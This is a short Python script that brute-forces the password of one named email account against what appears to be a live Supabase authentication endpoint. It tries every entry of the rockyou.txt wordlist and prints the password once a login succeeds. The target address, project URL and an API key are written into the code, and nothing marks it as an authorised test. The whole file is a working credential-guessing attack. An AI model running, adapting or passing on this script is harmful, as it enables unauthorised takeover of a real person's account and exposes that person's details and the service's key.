import requests
import sys

email = "s@corao.com"
wordlist = "/usr/share/wordlists/rockyou.txt"
url = "https://lmjtctanfbmiawffxyrl.supabase.co/auth/v1/token?grant_type=password"
headers = {
    "Content-Type": "application/json",
    "apikey": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImxtanRjdGFuZmJtaWF3ZmZ4eXJsIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzUwOTEzMDAsImV4cCI6MjA5MDY2NzMwMH0._8OHMNhJ3OYn3qM-dnKoS1LC3X4pOpNL7RtTfCVwpEc"
}

with open(wordlist, "r", encoding="utf-8", errors="ignore") as f:
    for password in f:
        password = password.strip()
        data = {"email": email, "password": password}
        try:
            r = requests.post(url, json=data, headers=headers, timeout=5)
            if r.status_code == 200:
                print(f"[+] ENCONTRADA: {password}")
                sys.exit()
            else:
                print(f"[-] {password}")
        except:
            pass
